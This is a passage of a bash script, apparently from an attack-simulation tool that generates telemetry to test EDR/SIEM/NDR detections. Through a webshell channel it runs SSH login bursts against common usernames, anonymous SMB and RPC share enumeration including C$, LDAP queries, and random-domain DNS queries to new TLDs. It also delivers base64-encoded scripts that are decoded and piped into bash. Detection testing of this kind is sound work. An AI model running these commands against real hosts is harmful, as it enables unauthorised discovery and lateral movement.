    write_report_entries "ssh_auth_burst" "T1110.001" "EDR/SIEM" "SSH Auth Failure Burst" "multi" "success" "executed=${executed}"
    save_ssh_auth_burst_overlap_result
}

save_ssh_auth_burst_overlap_result() {
    write_overlap_stage_result_env "ssh_auth_burst_result.env" \
        "SSH_ATTEMPTS_PLANNED" "${SSH_ATTEMPTS_PLANNED:-0}" \
        "SSH_ATTEMPTS_EXECUTED" "${SSH_ATTEMPTS_EXECUTED:-0}" \
        "SSH_AUTH_ATTEMPTED" "${SSH_AUTH_ATTEMPTED:-0}" \
        "SSH_AUTH_FAILURES_OBSERVED" "${SSH_AUTH_FAILURES_OBSERVED:-0}" \
        "FOLLOWUP_SSH_AUTH_FAILURES" "${FOLLOWUP_SSH_AUTH_FAILURES:-0}"
}

followup_stage_ssh() {
    if (( SSH_ATTEMPTS_EXECUTED > 0 )); then
        add_skipped_stage "SSH Follow-up" "Superseded by SSH Auth Burst stage"
        set_stage_result "SSH Follow-up" "Skipped" "SSH Auth Burst already executed"
        return 0
    fi
    local nodes target users user ssh_status="Success" ssh_reason="" attempts="${SSH_AUTH_FAILURE_TARGET}"
    local -a usernames=(invaliduser admin root test guest operator backup svc www postgres deploy azureuser)
    local ssh_idx=0 ssh_total precheck_line precheck_cmd precheck_ec precheck_out classification ssh_decision t0 t1 elapsed n
    poc_obs_stage_start "SSH Follow-up"
    nodes=$(get_followup_hosts "ssh_hosts.txt")
    if [[ -z "${nodes}" ]]; then
        poc_obs_record_followup "SSH Login Simulation" "n/a" "22" "not_found" "ssh" "n/a" "0" "no SSH targets discovered" \
            "config_missing" false false "" "0" "0" || true
        add_skipped_stage "SSH Follow-up" "No SSH targets discovered"
        set_stage_result "SSH Follow-up" "Skipped" "No SSH targets discovered (decision=skipped_config_missing)"
        poc_obs_stage_end "SSH Follow-up"
        return 0
    fi
    add_executed_stage "SSH Follow-up"
    write_report_entries "ssh_followup" "T1110/T1021.004" "NDR/SIEM" "Failed SSH Login" "multi" "start" "auth failure burst intensity=${FOLLOWUP_INTENSITY}"
    if [[ "${DRY_RUN}" == true ]]; then
        followup_record_ssh "$(( $(count_hosts_blob "${nodes}") * attempts ))"
        set_stage_result "SSH Follow-up" "Success" "dry-run"
        return 0
    fi
    ssh_total=$(count_hosts_blob "${nodes}")
    while IFS= read -r target; do
        [[ -z "${target}" ]] && continue
        ssh_idx=$((ssh_idx + 1))
        poc_obs_log "INFO" "SSH Follow-up Progress: ${ssh_idx}/${ssh_total} targets processed"
        precheck_line=$(poc_precheck_ssh "${target}" 22)
        poc_precheck_read_line "${precheck_line}" precheck_cmd precheck_ec precheck_out classification
        if ! poc_obs_should_run_followup "${classification}"; then
            ssh_decision=$(poc_obs_record_followup "SSH Login Simulation" "${target}" "22" "open" "ssh" \
                "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" false false "" "${precheck_ec}" "0")
            log_message "WARN" "SSH follow-up skipped for ${target}:22 decision=${ssh_decision}"
            continue
        fi
        t0=$(date +%s)
        n=0
        if [[ "${HAS_ssh:-false}" == true ]]; then
            run_webshell "ssh-aggressive-${target}" \
                "${REMOTE_SHELL_HELPERS}
users='invaliduser admin root test guest operator backup svc www postgres deploy'
for i in \$(seq_list ${attempts}); do
u=\$(echo \"\$users\" | tr ' ' '\\n' | sed -n \"\$((1+RANDOM%10))p\")
ssh -o BatchMode=yes -o PasswordAuthentication=no -o KbdInteractiveAuthentication=no \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=2 \
    -o NumberOfPasswordPrompts=0 \"\${u}@${target}\" 'exit' </dev/null >/dev/null 2>&1 || true
sleep \$((RANDOM%2))
done" >/dev/null
            followup_record_ssh "${attempts}"
            n="${attempts}"
        else
            local tcp_ssh_probe
            tcp_ssh_probe=$(build_remote_tcp_probe "${target}" 22)
            run_webshell "ssh-tcp-burst-${target}" \
                "${REMOTE_SHELL_HELPERS} for i in \$(seq_list ${attempts}); do ${tcp_ssh_probe}; sleep \$((RANDOM%2)); done" >/dev/null
            ssh_status="Fallback"
            ssh_reason="ssh missing; TCP/22 reconnect burst"
            followup_record_ssh "${attempts}"
            n="${attempts}"
            add_fallback_usage "SSH follow-up: TCP/22 burst (no password prompts)"
        fi
        t1=$(date +%s)
        elapsed=$((t1 - t0))
        ssh_decision=$(poc_obs_record_followup "SSH Login Simulation" "${target}" "22" "open" "ssh" \
            "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" true \
            "$(( n > 0 ))" "ssh auth failure burst" "0" "${elapsed}")
        poc_obs_log "EVIDENCE" "SSH follow-up ${target}:22 decision=${ssh_decision}"
    done <<< "${nodes}"
    poc_obs_stage_end "SSH Follow-up"
    poc_obs_log "SUMMARY" "SSH follow-up stage finished — status=${ssh_status}"
    set_stage_result "SSH Follow-up" "${ssh_status}" "${ssh_reason}"
    write_report_entries "ssh_followup" "T1110/T1021.004" "NDR/SIEM" "Failed SSH Login" "multi" "success" "ssh auth-failure telemetry (${FOLLOWUP_SSH_AUTH_FAILURES})"
}

followup_stage_smb() {
    local smb_nodes target probes="${SMB_PROBE_TARGET}" i
    local smb_idx=0 smb_total precheck_line precheck_cmd precheck_ec precheck_out classification smb_decision t0 t1 elapsed
    poc_obs_stage_start "SMB Follow-up"
    smb_nodes=$(get_followup_hosts "smb_hosts.txt")
    if [[ -z "${smb_nodes}" ]]; then
        poc_obs_record_followup "SMB Enumeration" "n/a" "445" "not_found" "smb" "n/a" "0" "no SMB targets" \
            "config_missing" false false "" "0" "0" || true
        add_skipped_stage "Windows/SMB Follow-up" "No SMB targets discovered"
        set_stage_result "Windows Telemetry" "Skipped" "No SMB targets discovered (decision=skipped_config_missing)"
        poc_obs_stage_end "SMB Follow-up"
        return 0
    fi
    add_executed_stage "Windows Telemetry"
    write_report_entries "windows_telemetry" "T1135/T1021.002" "NDR/XDR" "SMB Enumeration" "multi" "start" "aggressive SMB/RPC probes"
    local smb_host_n
    smb_host_n=$(count_hosts_blob "${smb_nodes}")
    SMB_PROBES_PLANNED=$((smb_host_n * probes))
    SMB_PROBES_ATTEMPTED="${SMB_PROBES_PLANNED}"
    if [[ "${DRY_RUN}" == true ]]; then
        followup_record_smb "${SMB_PROBES_PLANNED}"
        set_stage_result "Windows Telemetry" "Success" "dry-run"
        return 0
    fi
    smb_total=$(count_hosts_blob "${smb_nodes}")
    while IFS= read -r target; do
        [[ -z "${target}" ]] && continue
        pipeline_stop_requested && break
        smb_idx=$((smb_idx + 1))
        poc_obs_log "INFO" "SMB Follow-up Progress: ${smb_idx}/${smb_total} targets processed"
        precheck_line=$(poc_precheck_smb "${target}" 445)
        poc_precheck_read_line "${precheck_line}" precheck_cmd precheck_ec precheck_out classification
        if ! poc_obs_should_run_followup "${classification}"; then
            smb_decision=$(poc_obs_record_followup "SMB Enumeration" "${target}" "445" "open" "smb" \
                "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" false false "" "${precheck_ec}" "0")
            log_message "WARN" "SMB follow-up skipped for ${target}:445 decision=${smb_decision}"
            continue
        fi
        t0=$(date +%s)
        if [[ "${HAS_smbclient:-false}" == true || "${HAS_rpcclient:-false}" == true ]]; then
            run_webshell "smb-aggressive-${target}" \
                "${REMOTE_SHELL_HELPERS}
for i in \$(seq_list ${probes}); do
smbclient -L //${target} -N -U '' >/dev/null 2>&1 || true
smbclient //${target}/IPC\\\$ -N -U '' -c 'ls' >/dev/null 2>&1 || true
smbclient //${target}/C\\\$ -N -U '' -c 'ls' >/dev/null 2>&1 || true
rpcclient -N -U '' '${target}' -c 'srvinfo; netshareenumall' >/dev/null 2>&1 || true
poc_port_probe '${target}' 445 || true
sleep \$((RANDOM%2))
done" >/dev/null
            followup_record_smb "${probes}"
            SMB_PROBES_CONNECTED=$((SMB_PROBES_CONNECTED + probes))
        else
            local tcp_smb
            tcp_smb=$(build_remote_tcp_probe "${target}" 445)
            run_webshell "smb-tcp-burst-${target}" \
                "${REMOTE_SHELL_HELPERS} for i in \$(seq_list ${probes}); do ${tcp_smb}; poc_port_probe '${target}' 139 || true; sleep 1; done" >/dev/null
            followup_record_smb "${probes}"
            SMB_PROBES_CONNECTED=$((SMB_PROBES_CONNECTED + probes / 2))
            add_fallback_usage "SMB follow-up: TCP/445 enumeration burst"
        fi
        t1=$(date +%s)
        elapsed=$((t1 - t0))
        smb_decision=$(poc_obs_record_followup "SMB Enumeration" "${target}" "445" "open" "smb" \
            "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" true true \
            "smbclient/rpcclient burst" "0" "${elapsed}")
        poc_obs_log "EVIDENCE" "SMB follow-up ${target}:445 decision=${smb_decision}"
    done <<< "${smb_nodes}"
    poc_obs_stage_end "SMB Follow-up"
    poc_obs_log "SUMMARY" "SMB follow-up stage finished"
    local ldap_nodes
    ldap_nodes=$(get_local_hosts "ldap_hosts.txt")
    while IFS= read -r target; do
        [[ -z "${target}" ]] && continue
        if [[ "${HAS_ldapsearch:-false}" == true ]]; then
            run_webshell "ldap-aggressive-${target}" \
                "ldapsearch -x -H ldap://${target} -s base -b '' namingcontexts defaultNamingContext supportedLDAPVersion >/dev/null 2>&1 || true" \
                >/dev/null
            followup_record_smb 3
        else
            run_webshell "ldap-tcp-${target}" "$(build_remote_tcp_probe "${target}" 389)" >/dev/null
            followup_record_smb 1
        fi
    done <<< "${ldap_nodes}"
    set_stage_result "Windows Telemetry" "Success" "aggressive SMB/LDAP probes (${FOLLOWUP_INTENSITY})"
    write_report_entries "windows_telemetry" "T1135" "NDR/XDR" "SMB Enumeration" "multi" "success" "smb/ldap burst complete"
}

dns_new_tld_primary_pool() {
    printf '%s\n' click xyz link bid works fun top win onl diet page icu wiki pw design team
}

dns_new_tld_secondary_pool() {
    printf '%s\n' zip mov lol quest monster skin cyou site online shop
}

dns_new_tld_service_prefixes() {
    printf '%s\n' forms api cdn assets sync edge img portal cache
}

append_dns_new_tld_log() {
    local msg="$1"
    state_append "dns_new_tld_test.log" "cycle=${CURRENT_CYCLE:-1} ${msg}"
}

dns_new_tld_log_both() {
    local msg="$1"
    append_dns_new_tld_log "${msg}"
    log_message "OK" "DNS New TLD: ${msg}" >&2
}

dns_new_tld_build_webshell_delivery() {
    local raw_cmd="$1" delim="${2:-DNS_NEW_TLD_SCRIPT}"
    local body="" b64="" decoded=""
    dns_new_tld_log_both "DNS_NEW_TLD_PAYLOAD_BUILD_START delim=${delim} raw_bytes=${#raw_cmd}"
    body=$(dns_extract_remote_bash_body "${raw_cmd}" "${delim}" 2>/dev/null || true)
    if [[ -z "${body}" ]]; then
        dns_new_tld_log_both "DNS_NEW_TLD_PAYLOAD_BUILD_ERROR stage=extract_body reason=missing_bash_body delim=${delim}"
        return 1
    fi
    b64=$(printf '%s' "${body}" | b64_encode_no_wrap 2>/dev/null || true)
    if [[ -z "${b64}" ]]; then
        dns_new_tld_log_both "DNS_NEW_TLD_PAYLOAD_BUILD_ERROR stage=base64_encode reason=empty_encoded"
        return 1
    fi
    decoded=$(printf '%s' "${b64}" | base64 -d 2>/dev/null | tr -d '\r' || true)
    if [[ -z "${decoded}" ]]; then
        dns_new_tld_log_both "DNS_NEW_TLD_PAYLOAD_BUILD_ERROR stage=base64_decode reason=empty_decoded_local"
        return 1
    fi
    cat <<EOF
${REMOTE_SHELL_HELPERS}
b64='${b64}'
_dec=\$(printf '%s' "\${b64}" | base64 -d 2>/dev/null | tr -d '\r')
if [ -z "\${_dec}" ]; then echo "DNS_NEW_TLD_PAYLOAD_BUILD_ERROR stage=base64_decode_remote reason=empty_decoded"; exit 1; fi
printf '%s' "\${_dec}" | bash -s
EOF
}

dns_new_tld_resolve_query_tool() {
    DNS_NEW_TLD_QUERY_TOOL=""
    if [[ "${HAS_dig:-false}" == true ]]; then
        DNS_NEW_TLD_QUERY_TOOL="dig"
        return 0
    fi
    if [[ "${HAS_nslookup:-false}" == true ]]; then
        DNS_NEW_TLD_QUERY_TOOL="nslookup"
        return 0
    fi
    if [[ "${HAS_host:-false}" == true ]]; then
        DNS_NEW_TLD_QUERY_TOOL="host"
        return 0
    fi
    DNS_NEW_TLD_SKIP_REASON="dns_tool_missing"
    return 1
}

dns_new_tld_compute_detection_likelihood() {
    local unique_tlds="$1" tested_domains="$2"
    unique_tlds=$(safe_int "${unique_tlds}")
    tested_domains=$(safe_int "${tested_domains}")
    DNS_NEW_TLD_DETECTION_LIKELIHOOD="LOW"
    DNS_NEW_TLD_DETECTION_REASON="insufficient_tld_diversity"
    if (( unique_tlds >= 5 && tested_domains >= 10 )); then
        DNS_NEW_TLD_DETECTION_LIKELIHOOD="HIGH"
        DNS_NEW_TLD_DETECTION_REASON="diverse_new_tld_burst"
        return 0
    fi
    if (( unique_tlds >= 3 && unique_tlds <= 4 )); then
        DNS_NEW_TLD_DETECTION_LIKELIHOOD="MEDIUM"
        DNS_NEW_TLD_DETECTION_REASON="moderate_new_tld_diversity"
        return 0
    fi
    if (( unique_tlds <= 2 )); then
        DNS_NEW_TLD_DETECTION_REASON="low_tld_diversity"
    fi
}

validate_dns_fqdn() {
    local fqdn="$1" reason_var="${2:-}"
    local label="" len=0 total=0
    fqdn=$(printf '%s' "${fqdn}" | tr '[:upper:]' '[:lower:]' | sed 's/^[.]//;s/[.]$//')
    [[ -z "${fqdn}" ]] && { [[ -n "${reason_var}" ]] && printf -v "${reason_var}" '%s' "invalid_fqdn"; return 1; }
    [[ "${fqdn}" == *".."* || "${fqdn}" == *" "* || "${fqdn}" == *$'\t'* ]] && {
        [[ -n "${reason_var}" ]] && printf -v "${reason_var}" '%s' "invalid_fqdn"
        return 1
    }
    if [[ ! "${fqdn}" =~ ^[a-z0-9]([a-z0-9.-]*[a-z0-9])?$ ]]; then
        [[ -n "${reason_var}" ]] && printf -v "${reason_var}" '%s' "bad_character"
        return 1
    fi
    total=${#fqdn}
    (( total > 253 )) && { [[ -n "${reason_var}" ]] && printf -v "${reason_var}" '%s' "invalid_fqdn"; return 1; }
    while IFS= read -r label; do
        [[ -z "${label}" ]] && { [[ -n "${reason_var}" ]] && printf -v "${reason_var}" '%s' "invalid_fqdn"; return 1; }
        len=${#label}
        (( len > 63 )) && { [[ -n "${reason_var}" ]] && printf -v "${reason_var}" '%s' "label_too_long"; return 1; }
        [[ ! "${label}" =~ ^[a-z0-9]([a-z0-9-]*[a-z0-9])?$ ]] && {
            [[ -n "${reason_var}" ]] && printf -v "${reason_var}" '%s' "bad_character"
            return 1
        }
    done < <(printf '%s' "${fqdn}" | tr '.' '\n')
    [[ -n "${reason_var}" ]] && printf -v "${reason_var}" '%s' "ok"
    return 0
}

dns_new_tld_classify_failure_root_cause() {
    local out="$1" payload="$2"
    local low="" rc=""
    low=$(printf '%s' "${out}" | tr '[:upper:]' '[:lower:]')
    if [[ "${low}" == *dns_payload_syntax_error* ]]; then
        printf '%s' "payload_encode_failure"
        return 0
    fi
    if [[ "${low}" == *dns_new_tld_root_cause=* ]]; then
        rc=$(printf '%s\n' "${out}" | tr -d '\r' | sed -n 's/.*DNS_NEW_TLD_ROOT_CAUSE=\([^[:space:]]*\).*/\1/p' | tail -n1)
        [[ -n "${rc}" ]] && printf '%s' "${rc}" && return 0
    fi
    rc=$(poc_classify_dns_dga_root_cause "DNS_NEW_TLD" "${payload}" "${out}" | head -n1 || true)
    case "${rc}" in
        resolver_unreachable) printf '%s' "resolver_failure" ;;
        dns_connectivity_failure|all_queries_timeout) printf '%s' "resolver_failure" ;;
        DIG_MISSING|dns_tool_missing) printf '%s' "dig_failure" ;;
        dns_query_failed) printf '%s' "dig_failure" ;;
        heredoc_termination_corruption|function_scope_corruption|payload_truncated|payload_syntax_error|webshell_transport_limit)
            printf '%s' "payload_encode_failure" ;;
        COMMAND_TIMEOUT|webshell_timeout) printf '%s' "resolver_failure" ;;
        invalid_tld_pool) printf '%s' "invalid_fqdn" ;;
        *) printf '%s' "unknown" ;;
    esac
}

dns_new_tld_log_root_cause() {
    local cause="$1" detail="${2:-}"
    DNS_NEW_TLD_LAST_ROOT_CAUSE="${cause}"
    dns_new_tld_log_both "DNS_NEW_TLD_ROOT_CAUSE=${cause} detail=${detail}"
    dns_new_tld_log_both "ROOT_CAUSE=${cause} module=DNS_NEW_TLD detail=${detail}"
}

build_dns_new_tld_simulation_remote_cmd() {
    local resolver="$1" domain_count="$2" tool="$3"
    local remote_ntld_ev=""
    domain_count=$(safe_int "${domain_count}")
    (( domain_count < DNS_NEW_TLD_MIN_DOMAINS )) && domain_count="${DNS_NEW_TLD_MIN_DOMAINS}"
    (( domain_count > DNS_NEW_TLD_MAX_DOMAINS )) && domain_count="${DNS_NEW_TLD_MAX_DOMAINS}"
    remote_ntld_ev=$(net_sim_remote_new_tld_event_path)
    remote_bash_script_open 'DNS_NEW_TLD_SCRIPT'
    cat <<EOF
ntld_ev='${remote_ntld_ev}'
run_id='${CAMPAIGN_ID:-run}'
mkdir -p "\$(dirname "\$ntld_ev")" 2>/dev/null || true
printf 'timestamp\trun_id\tmodule\tstage\ttarget\taction\tartifact\tstatus\texit_code\tevidence_value\tsource\n' > "\$ntld_ev"
ntld_tsv_row(){
  local st="\$1" dom="\$2" tld="\$3" ts=""
  ts=\$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || date +%s)
  printf '%s\t%s\tDNS_NEW_TLD\tnew_tld\t%s\tquery\tdomain\t%s\t0\t%s|%s\tremote_new_tld_simulator\n' \\
    "\$ts" "\$run_id" "\$srv" "\$st" "\$dom" "\$tld" >> "\$ntld_ev"
}
primary_tlds='click xyz link bid works fun top win onl diet page icu wiki pw design team'
secondary_tlds='zip mov lol quest monster skin cyou site online shop'
prefixes='forms api cdn assets sync edge img portal cache'
srv='${resolver}'
tool='${tool}'
domain_n=${domain_count}
queries=0; ok_q=0; fail_q=0; domains=0; generated=0; valid_fqdns=0; invalid_fqdns=0
a_q=0; aaaa_q=0; https_q=0; txt_q=0
tld_stats=''
seen_tlds=''
tested_tlds=''
dns_nt_rand_label(){
n=\$((8 + RANDOM % 13))
if [ -r /dev/urandom ]; then
    s=\$(head -c 32 /dev/urandom 2>/dev/null | tr -dc 'a-z0-9' | head -c "\${n}")
else
    s=\$(printf '%s%s' "\$RANDOM" "\$RANDOM" | tr -dc 'a-z0-9' | head -c "\${n}")
fi
[ -n "\$s" ] || s="poc\${RANDOM}"
printf '%s' "\$s"
}
dns_nt_pick_tld(){
local idx=\$1
if [ "\$idx" -le 16 ]; then
    echo "\$primary_tlds" | tr ' ' '\\n' | sed -n "\${idx}p"
else
    echo "\$secondary_tlds" | tr ' ' '\\n' | sed -n "\$((idx - 16))p"
fi
}
dns_nt_pick_prefix(){
echo "\$prefixes" | tr ' ' '\\n' | sed -n "\$((1 + RANDOM % 8))p"
}
dns_nt_pick_qtype(){
r=\$((RANDOM % 10))
if [ "\$r" -lt 4 ]; then printf 'A'
elif [ "\$r" -lt 6 ]; then printf 'AAAA'
elif [ "\$r" -lt 8 ]; then printf 'HTTPS'
else printf 'TXT'; fi
}
dns_nt_is_to(){ case "\$1" in *timed\ out*|*TIMEOUT*|*refused*|*unreachable*|*no\ servers*) return 0;; esac; return 1; }
dns_nt_is_ok(){ case "\$1" in *NXDOMAIN*|*"not found"*|*can't\ find*|*IN[[:space:]]*|*has\ address*|*Address:*|*ANSWER\ SECTION*) return 0;; esac; return 1; }
dns_nt_validate_fqdn(){
local fqdn="\$1" label="" len=0 total=0 reason=""
fqdn=\$(printf '%s' "\$fqdn" | tr '[:upper:]' '[:lower:]' | sed 's/^[.]//;s/[.]$//')
[ -z "\$fqdn" ] && { echo invalid_fqdn; return 1; }
case "\$fqdn" in *" "*|*".."*) echo invalid_fqdn; return 1;; esac
total=\${#fqdn}
[ "\$total" -gt 253 ] 2>/dev/null && { echo invalid_fqdn; return 1; }
for label in \$(printf '%s' "\$fqdn" | tr '.' ' '); do
    [ -z "\$label" ] && { echo invalid_fqdn; return 1; }
    len=\${#label}
    [ "\$len" -gt 63 ] 2>/dev/null && { echo label_too_long; return 1; }
    printf '%s' "\$label" | grep -qE '^[a-z0-9]([a-z0-9-]*[a-z0-9])?$' || { echo bad_character; return 1; }
done
echo ok
return 0
}
dns_nt_elapsed_ms(){
t1=\$(date +%s%3N 2>/dev/null || date +%s)
t0=\$1
printf '%s' \$((t1 - t0))
}
dns_nt_run_query(){
local dom="\$1" tld="\$2" qtype="\$3" out="" res="error" el=0 t0=0
t0=\$(date +%s%3N 2>/dev/null || date +%s)
queries=\$((queries + 1))
ev_ts=\$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || date -u +%Y-%m-%dT%H:%M:%SZ)
printf 'DNS_NEW_TLD_SENT fqdn=%s qtype=%s\n' "\$dom" "\$qtype"
ntld_tsv_row sent "\$dom" "\$tld"
printf 'NEW_TLD_EVENT timestamp=%s module=DNS_NEW_TLD stage=new_tld target=%s action=query status=sent value=%s|%s\n' "\$ev_ts" "\$srv" "\$dom" "\$tld"
printf 'QUERY_GENERATED fqdn=%s qtype=%s stage=dns_new_tld\n' "\$dom" "\$qtype"
case "\$qtype" in
    A) a_q=\$((a_q + 1));;
    AAAA) aaaa_q=\$((aaaa_q + 1));;
    HTTPS) https_q=\$((https_q + 1));;
    TXT) txt_q=\$((txt_q + 1));;
esac
if [ "\$tool" = nslookup ]; then
    if [ "\$srv" = system ] || [ -z "\$srv" ]; then
    if [ "\$qtype" = TXT ]; then out=\$(nslookup -timeout=2 -type=TXT "\$dom" 2>&1)
    elif [ "\$qtype" = AAAA ]; then out=\$(nslookup -timeout=2 -type=AAAA "\$dom" 2>&1)
    else out=\$(nslookup -timeout=2 "\$dom" 2>&1); fi
    else
    if [ "\$qtype" = TXT ]; then out=\$(nslookup -timeout=2 -type=TXT "\$dom" "\$srv" 2>&1)
    elif [ "\$qtype" = AAAA ]; then out=\$(nslookup -timeout=2 -type=AAAA "\$dom" "\$srv" 2>&1)
    else out=\$(nslookup -timeout=2 "\$dom" "\$srv" 2>&1); fi
    fi
elif [ "\$tool" = host ]; then
    if [ "\$srv" = system ] || [ -z "\$srv" ]; then out=\$(host -W 2 -t "\$qtype" "\$dom" 2>&1)
    else out=\$(host -W 2 -t "\$qtype" "\$dom" "\$srv" 2>&1); fi
else
    if [ "\$srv" = system ] || [ -z "\$srv" ]; then
    if [ "\$qtype" = HTTPS ]; then out=\$(dig +time=2 +tries=1 "\$dom" HTTPS +noall +answer +comments 2>&1); [ -z "\$out" ] && out=\$(dig +time=2 +tries=1 "\$dom" TYPE65 +noall +answer +comments 2>&1)
    else out=\$(dig +time=2 +tries=1 "\$dom" "\$qtype" +noall +answer +comments 2>&1); fi
    else
    if [ "\$qtype" = HTTPS ]; then out=\$(dig +time=2 +tries=1 @"\$srv" "\$dom" HTTPS +noall +answer +comments 2>&1); [ -z "\$out" ] && out=\$(dig +time=2 +tries=1 @"\$srv" "\$dom" TYPE65 +noall +answer +comments 2>&1)
    else out=\$(dig +time=2 +tries=1 @"\$srv" "\$dom" "\$qtype" +noall +answer +comments 2>&1); fi
    fi
fi
printf 'QUERY_SENT fqdn=%s qtype=%s stage=dns_new_tld\n' "\$dom" "\$qtype"
el=\$(dns_nt_elapsed_ms "\$t0")
if dns_nt_is_to "\$out"; then res=timeout; fail_q=\$((fail_q + 1)); printf 'QUERY_TIMEOUT fqdn=%s qtype=%s stage=dns_new_tld\n' "\$dom" "\$qtype"; ntld_tsv_row timeout "\$dom" "\$tld"; printf 'NEW_TLD_EVENT timestamp=%s module=DNS_NEW_TLD stage=new_tld target=%s action=query status=timeout value=%s|%s\n' "\$ev_ts" "\$srv" "\$dom" "\$tld"
elif dns_nt_is_ok "\$out"; then res=ok; ok_q=\$((ok_q + 1)); ntld_tsv_row response "\$dom" "\$tld"; printf 'NEW_TLD_EVENT timestamp=%s module=DNS_NEW_TLD stage=new_tld target=%s action=query status=response value=%s|%s\n' "\$ev_ts" "\$srv" "\$dom" "\$tld"
else res=error; fail_q=\$((fail_q + 1)); printf 'QUERY_ERROR fqdn=%s qtype=%s stage=dns_new_tld reason=resolver_error\n' "\$dom" "\$qtype"; ntld_tsv_row error "\$dom" "\$tld"; printf 'NEW_TLD_EVENT timestamp=%s module=DNS_NEW_TLD stage=new_tld target=%s action=query status=error value=%s|%s\n' "\$ev_ts" "\$srv" "\$dom" "\$tld"; fi
printf 'QUERY_RESPONSE fqdn=%s qtype=%s stage=dns_new_tld rcode=%s\n' "\$dom" "\$qtype" "\$res"
printf 'DNS_NEW_TLD_RESPONSE fqdn=%s rcode=%s qtype=%s\n' "\$dom" "\$res" "\$qtype"
printf 'DNS_NEW_TLD_QUERY domain=%s tld=%s query_type=%s resolver=%s result=%s elapsed_ms=%s\n' "\$dom" "\$tld" "\$qtype" "\$srv" "\$res" "\$el"
}
dns_nt_tld_bump(){
local t="\$1"
case " \${seen_tlds} " in *" \${t} "*) ;;
*) seen_tlds="\${seen_tlds} \${t}"; tested_tlds="\${tested_tlds} \${t}";; esac
local cur=0
cur=\$(printf '%s' "\$tld_stats" | tr ' ' '\\n' | awk -v t="\$t" -F= '\$1=="tld"&&\$2==t{getline; if(\$1=="queries") print \$2}')
[ -z "\$cur" ] && cur=0
tld_stats="\${tld_stats} tld=\${t} queries=\$((cur+1))"
}
echo "DNS_NEW_TLD_TEST_START resolver=\$srv tool=\$tool planned_domains=\$domain_n"
i=1
while [ "\$i" -le "\$domain_n" ]; do
tld=\$(dns_nt_pick_tld "\$i")
[ -z "\$tld" ] && tld=click
pref=\$(dns_nt_pick_prefix)
lbl=\$(dns_nt_rand_label)
dom="\${pref}.\${lbl}.\${tld}"
qtype=\$(dns_nt_pick_qtype)
generated=\$((generated + 1))
printf 'DNS_NEW_TLD_GENERATED domain=%s\n' "\$dom"
ntld_tsv_row generated "\$dom" "\$tld"
printf 'NEW_TLD_EVENT timestamp=%s module=DNS_NEW_TLD stage=new_tld target=%s action=query status=generated value=%s|%s\n' "\$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || date +%s)" "\$srv" "\$dom" "\$tld"
fqdn_valid=\$(dns_nt_validate_fqdn "\$dom" || true)
if [ "\$fqdn_valid" != ok ]; then
    invalid_fqdns=\$((invalid_fqdns + 1))
    printf 'DNS_NEW_TLD_PAYLOAD_BUILD_ERROR stage=fqdn_validate fqdn=%s reason=%s\n' "\$dom" "\${fqdn_valid:-invalid_fqdn}"
    printf 'DNS_NEW_TLD_QUERY fqdn=%s query_type=%s tld=%s valid=no reason=%s\n' "\$dom" "\$qtype" "\$tld" "\${fqdn_valid:-invalid_fqdn}"
    fail_q=\$((fail_q + 1))
    i=\$((i + 1))
    sleep "0.\$(printf '%02d' \$((2 + RANDOM % 8)))"
    continue
fi
valid_fqdns=\$((valid_fqdns + 1))
domains=\$((domains + 1))
printf 'DNS_NEW_TLD_FQDN_VALID fqdn=%s\n' "\$dom"
printf 'DNS_NEW_TLD_QUERY fqdn=%s query_type=%s tld=%s valid=yes\n' "\$dom" "\$qtype" "\$tld"
dns_nt_tld_bump "\$tld"
dns_nt_run_query "\$dom" "\$tld" "\$qtype"
i=\$((i + 1))
sleep "0.\$(printf '%02d' \$((2 + RANDOM % 8)))"
done
unique_tlds=0
for t in \$seen_tlds; do unique_tlds=\$((unique_tlds + 1)); done
for t in \$seen_tlds; do
u=0
for d in \$tested_tlds; do [ "\$d" = "\$t" ] && u=\$((u+1)); done
printf 'DNS_NEW_TLD_TLD_STATS tld=%s queries=%s unique_domains=%s\n' "\$t" "\$(printf '%s' "\$tld_stats" | tr ' ' '\\n' | awk -v tl="\$t" '\$1=="tld"&&\$2==tl{getline; if(\$1=="queries") print \$2}')" "\$u"
done
query_types="A=\${a_q}/AAAA=\${aaaa_q}/HTTPS=\${https_q}/TXT=\${txt_q}"
printf 'DNS_NEW_TLD_SUMMARY tested_domains=%s tested_tlds=%s unique_tlds=%s query_count=%s query_types=%s successful_queries=%s failed_queries=%s generated=%s valid=%s invalid=%s duration_seconds=0 detection_likelihood=LOW\n' \
"\$domains" "\$tested_tlds" "\$unique_tlds" "\$queries" "\$query_types" "\$ok_q" "\$fail_q" "\$generated" "\$valid_fqdns" "\$invalid_fqdns"
echo "NEW_TLD_REMOTE_EVENT_FILE path=\$ntld_ev exists=\$( [ -f "\$ntld_ev" ] && printf yes || printf no ) lines=\$(awk 'END{print NR}' "\$ntld_ev" 2>/dev/null || echo 0)"
EOF
    remote_bash_script_close 'DNS_NEW_TLD_SCRIPT'
}

parse_dns_new_tld_output() {
    local out="$1" merged=0
    if [[ "${DRY_RUN}" != true ]]; then
        net_sim_fetch_remote_new_tld_events && merged=$(safe_int "${NEW_TLD_REMOTE_EVENT_FETCH_LINES:-0}") || merged=0
    fi
    if (( merged < 1 )); then
        ingest_remote_events "${out}" "DNS_NEW_TLD" || true
    fi
    build_module_summary_from_events "DNS_NEW_TLD" 2>/dev/null || true
    event_sync_legacy_counters_from_sot || true
    [[ -s "${EVENT_NEW_TLD_EVENTS:-}" ]] && return 0
    local summary="" line="" tld="" domains=0 unique=0 queries=0 ok_q=0 fail_q=0
    local a_q=0 aaaa_q=0 https_q=0 txt_q=0 tested_tlds="" query_types=""
    local generated=0 valid=0 invalid=0
    summary=$(printf '%s\n' "${out}" | tr -d '\r' | grep -E '^DNS_NEW_TLD_SUMMARY' | tail -n1 || true)
    [[ -z "${summary}" ]] && return 1
    domains=$(safe_int "$(dns_stats_field_from_line "${summary}" tested_domains)")
    unique=$(safe_int "$(dns_stats_field_from_line "${summary}" unique_tlds)")
    queries=$(safe_int "$(dns_stats_field_from_line "${summary}" query_count)")
    ok_q=$(safe_int "$(dns_stats_field_from_line "${summary}" successful_queries)")
